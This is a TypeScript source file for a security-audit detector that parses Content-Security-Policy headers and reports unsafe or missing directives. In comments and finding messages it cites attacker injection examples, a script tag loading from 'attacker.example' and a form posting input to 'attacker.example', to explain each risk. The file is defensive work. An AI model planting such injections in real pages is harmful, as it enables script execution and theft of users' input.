/**
 * contentSecurityPolicy.ts — full Content-Security-Policy
 * response-header audit. T76.
 *
 * CSP is the foundational web-security header. It declares
 * which origins the browser is allowed to load resources from,
 * which inline / eval'd code patterns are permitted, and which
 * DOM sinks are gated by Trusted Types. A correctly-configured
 * CSP is the single largest XSS-mitigation control the web has.
 *
 * Detector philosophy: surface the defects that REAL incidents
 * have shown to matter. We deliberately don't lint the entire
 * W3C CSP-3 grammar — focus on directives whose absence or
 * misconfiguration enabled actual cross-site exfiltration in
 * the public CVE record.
 *
 * Findings:
 *
 *   - csp.missing                       warn
 *     No Content-Security-Policy header at all. Every script
 *     source, every image origin, every connect endpoint is
 *     allowed. The most common defect — defaults are unsafe.
 *
 *   - csp.script-unsafe-inline          strict
 *     `script-src 'unsafe-inline'` (or default-src fallback
 *     allowing inline). The single most common CSP bypass
 *     mechanism — once 'unsafe-inline' is set, an attacker who
 *     finds ANY HTML-injection sink can execute arbitrary
 *     script. Negates ~80% of CSP's value.
 *
 *   - csp.script-unsafe-eval            strict
 *     `script-src 'unsafe-eval'`. Allows eval(), Function(),
 *     setTimeout(string), setInterval(string). Required only
 *     for legacy frameworks; modern code should use parse-time
 *     transformations.
 *
 *   - csp.script-wildcard               strict
 *     `script-src *` or `script-src https:`. Effectively no
 *     restriction on script origin. If the page can XSS-inject
 *     a `<script src=//attacker.example>`, CSP doesn't stop it.
 *
 *   - csp.no-default-src                warn
 *     No `default-src` AND no `script-src`. Resources
 *     unconstrained by other directives fall back to default
 *     allow.
 *
 *   - csp.no-object-src                 warn
 *     No `object-src 'none'`. Browsers still honour `<object>`,
 *     `<embed>`, `<applet>` if not explicitly blocked. Modern
 *     baseline: `object-src 'none'`.
 *
 *   - csp.no-base-uri                   warn
 *     No `base-uri` directive. An attacker who controls a single
 *     `<base href>` element can hijack every relative URL on the
 *     page. Modern baseline: `base-uri 'self'` or `'none'`.
 *
 *   - csp.no-form-action                warn
 *     No `form-action` directive. An attacker-controlled `<form
 *     action="https://attacker.example">` can exfiltrate input.
 *     Modern baseline: `form-action 'self'`.
 *
 *   - csp.no-frame-ancestors            warn
 *     No `frame-ancestors` directive. Clickjacking surface.
 *     Note: xFrameOptions detector also catches this from a
 *     different angle (no XFO + no frame-ancestors → strict
 *     there). Here it's a CSP-completeness warn — the operator
 *     might have set an XFO but not the modern equivalent.
 *
 *   - csp.no-trusted-types              warn
 *     No `require-trusted-types-for 'script'` directive. Trusted
 *     Types is the W3C-blessed modern DOM-XSS-prevention layer:
 *     all writes to dangerous DOM sinks (innerHTML, outerHTML,
 *     document.write, eval'd via setTimeout, etc.) MUST go
 *     through a typed policy. Eliminates an entire class of
 *     DOM-based XSS at the platform level. Chrome ships;
 *     Firefox shipping; Safari implementation in flight.
 *     SUPERSOCIETY: this is one of the highest-leverage modern
 *     security controls in the browser.
 *
 *   - csp.invalid                       warn
 *     Header present but unparseable into any directive. The
 *     browser ignores it.
 *
 * Out of scope (consistent with other response-header detectors):
 *   * Localhost / 127.0.0.1 / *.localhost — fixture-mode
 *     short-circuit family.
 *   * http pages — CSP applies on http but the page already has
 *     bigger problems; we keep the localhost exemption only.
 *   * Content-Security-Policy-Report-Only — surfaced separately
 *     in a future cycle; not flagged as missing CSP if the
 *     enforcing header is also missing (would double-fire).
 *   * Nonce / hash validity — would require correlating with
 *     inline `<script nonce>` in the rendered DOM. Out of scope
 *     for the response-header detector layer.
 *
 * Reads from the same `topLevelResponseHeaders` Map as hsts /
 * xframe / referrer / cookieSecurity / permissionsPolicy. SIXTH
 * consumer of the shared capture path. The shape of this third
 * multi-value header detector finally clarifies the helper-
 * extract decision (see DOGFOOD_RUNS.md cycle 22 for the
 * comparison).
 */

export interface CspFinding {
  severity: 'strict' | 'warn';
  kind: string;
  detail: string;
  evidence: Record<string, unknown>;
}

export interface CspDirective {
  name: string;
  tokens: string[];
}

export interface CspSnapshot {
  pageUrl: string;
  pageIsLocalhost: boolean;
  /** Raw enforcing header value, or null if absent. */
  raw: string | null;
  /** Directives in declaration order. Empty if no header. */
  directives: CspDirective[];
  /** True iff header was present but no directive parsed. */
  unparseable: boolean;
}

function isLocalhost(url: string): boolean {
  try {
    const u = new URL(url);
    const h = u.hostname;
    return h === 'localhost' || h === '127.0.0.1' || h === '::1' || h.endsWith('.localhost');
  } catch {
    return false;
  }
}

function getHeader(headers: Record<string, string> | undefined, name: string): string | null {
  if (!headers) return null;
  for (const [k, v] of Object.entries(headers)) {
    if (k.toLowerCase() === name) return v;
  }
  return null;
}

/**
 * Parse the enforcing CSP header into a list of (name, tokens)
 * directives. CSP syntax: `name token1 token2; name token1; ...`
 *
 * - Directive names are lowercase per the W3C spec.
 * - Source-list tokens are case-sensitive (host names, scheme
 *   prefixes, keywords). The keywords ARE lowercase ('self',
 *   'unsafe-inline', etc.) but we normalise the names only.
 * - Empty directives (e.g. trailing `;`) are tolerated.
 * - Browsers ignore directives with unknown names but enforce
 *   the rest; we keep them in the snapshot for visibility but
 *   don't classify them.
 */
function parseCsp(raw: string): CspDirective[] {
  const out: CspDirective[] = [];
  for (const part of raw.split(';')) {
    const trimmed = part.trim();
    if (!trimmed) continue;
    const tokens = trimmed.split(/\s+/);
    if (tokens.length === 0) continue;
    const name = tokens[0].toLowerCase();
    if (!name) continue;
    out.push({ name, tokens: tokens.slice(1) });
  }
  return out;
}

export function buildCspSnapshot(
  pageUrl: string,
  headers: Record<string, string> | undefined,
): CspSnapshot {
  const pageIsLocalhost = isLocalhost(pageUrl);
  const raw = getHeader(headers, 'content-security-policy');
  if (raw === null) {
    return { pageUrl, pageIsLocalhost, raw: null, directives: [], unparseable: false };
  }
  const directives = parseCsp(raw);
  const unparseable = raw.trim().length > 0 && directives.length === 0;
  return { pageUrl, pageIsLocalhost, raw, directives, unparseable };
}

/**
 * Resolve the effective source-list for `script-src`. Per the
 * W3C spec, when `script-src` is absent the browser falls back
 * to `default-src`. If neither is present, scripts default to
 * unrestricted.
 */
function resolveScriptSrc(directives: CspDirective[]): { tokens: string[]; from: 'script-src' | 'default-src' | 'none' } {
  const script = directives.find((d) => d.name === 'script-src');
  if (script) return { tokens: script.tokens, from: 'script-src' };
  const def = directives.find((d) => d.name === 'default-src');
  if (def) return { tokens: def.tokens, from: 'default-src' };
  return { tokens: [], from: 'none' };
}

function hasDirective(directives: CspDirective[], name: string): boolean {
  return directives.some((d) => d.name === name);
}

export function detectCspIssues(snap: CspSnapshot): CspFinding[] {
  if (snap.pageIsLocalhost) return [];
  const out: CspFinding[] = [];

  if (snap.raw === null) {
    out.push({
      severity: 'warn',
      kind: 'csp.missing',
      detail: `No Content-Security-Policy header on this page. Every script source, every image origin, every connect endpoint is allowed by default. CSP is the single largest XSS-mitigation control the web has — set at minimum 'default-src \\'self\\'; object-src \\'none\\'; base-uri \\'self\\'; form-action \\'self\\''.`,
      evidence: {},
    });
    return out;
  }

  if (snap.unparseable) {
    out.push({
      severity: 'warn',
      kind: 'csp.invalid',
      detail: `Content-Security-Policy header is present but couldn't be parsed into any directive. Browsers ignore unparseable values. Header value: '${snap.raw.slice(0, 200)}'.`,
      evidence: { raw: snap.raw.slice(0, 200) },
    });
    return out;
  }

  // ---- script-src checks ----
  const scriptSrc = resolveScriptSrc(snap.directives);
  if (scriptSrc.from === 'none') {
    out.push({
      severity: 'warn',
      kind: 'csp.no-default-src',
      detail: `Content-Security-Policy declares neither 'default-src' nor 'script-src'. Scripts can load from any origin. Add at minimum 'default-src \\'self\\''.`,
      evidence: { declared: snap.directives.map((d) => d.name) },
    });
  } else {
    const tokens = scriptSrc.tokens;
    if (tokens.includes("'unsafe-inline'")) {
      out.push({
        severity: 'strict',
        kind: 'csp.script-unsafe-inline',
        detail: `${scriptSrc.from} contains 'unsafe-inline' — once set, ANY HTML-injection sink becomes XSS. Use nonces ('nonce-<random>') or hashes ('sha256-<base64>') instead. Negates roughly 80% of CSP's protective value.`,
        evidence: { directive: scriptSrc.from, tokens },
      });
    }
    if (tokens.includes("'unsafe-eval'")) {
      out.push({
        severity: 'strict',
        kind: 'csp.script-unsafe-eval',
        detail: `${scriptSrc.from} contains 'unsafe-eval' — allows eval(), Function(), setTimeout(string), setInterval(string). Required only for legacy frameworks; modern code uses parse-time transforms.`,
        evidence: { directive: scriptSrc.from, tokens },
      });
    }
    if (tokens.includes('*') || tokens.includes('https:') || tokens.includes('http:')) {
      out.push({
        severity: 'strict',
        kind: 'csp.script-wildcard',
        detail: `${scriptSrc.from} contains a wildcard ('*' or scheme-only 'https:'/'http:') — every origin can serve script. CSP cannot stop an injected '<script src=//attacker.example>'. Restrict to specific origins (e.g. 'https://cdn.example.com').`,
        evidence: { directive: scriptSrc.from, tokens },
      });
    }
  }

  // ---- structural baseline directives ----
  if (!hasDirective(snap.directives, 'object-src')) {
    out.push({
      severity: 'warn',
      kind: 'csp.no-object-src',
      detail: `No 'object-src' directive. Browsers still honour <object>, <embed>, <applet> if not explicitly blocked. Modern baseline: 'object-src \\'none\\''.`,
      evidence: {},
    });
  }
  if (!hasDirective(snap.directives, 'base-uri')) {
    out.push({
      severity: 'warn',
      kind: 'csp.no-base-uri',
      detail: `No 'base-uri' directive. An attacker who controls a single '<base href>' element can hijack every relative URL on the page. Modern baseline: 'base-uri \\'self\\'' or 'base-uri \\'none\\''.`,
      evidence: {},
    });
  }
  if (!hasDirective(snap.directives, 'form-action')) {
    out.push({
      severity: 'warn',
      kind: 'csp.no-form-action',
      detail: `No 'form-action' directive. An attacker-controlled '<form action=//attacker.example>' can exfiltrate input. Modern baseline: 'form-action \\'self\\''.`,
      evidence: {},
    });
  }
  if (!hasDirective(snap.directives, 'frame-ancestors')) {
    out.push({
      severity: 'warn',
      kind: 'csp.no-frame-ancestors',
      detail: `No 'frame-ancestors' directive. Clickjacking surface. Modern baseline: 'frame-ancestors \\'none\\''. (xFrameOptions detector covers the same threat from the legacy-header angle.)`,
      evidence: {},
    });
  }
  if (!hasDirective(snap.directives, 'require-trusted-types-for')) {
    out.push({
      severity: 'warn',
      kind: 'csp.no-trusted-types',
      detail: `No 'require-trusted-types-for' directive. Trusted Types is the W3C-blessed modern DOM-XSS-prevention layer — all writes to dangerous DOM sinks (innerHTML, outerHTML, document.write, eval'd setTimeout) MUST go through a typed policy, eliminating an entire class of DOM-based XSS at the platform level. Add 'require-trusted-types-for \\'script\\'' (and a 'trusted-types' policy list).`,
      evidence: {},
    });
  }

  return out;
}
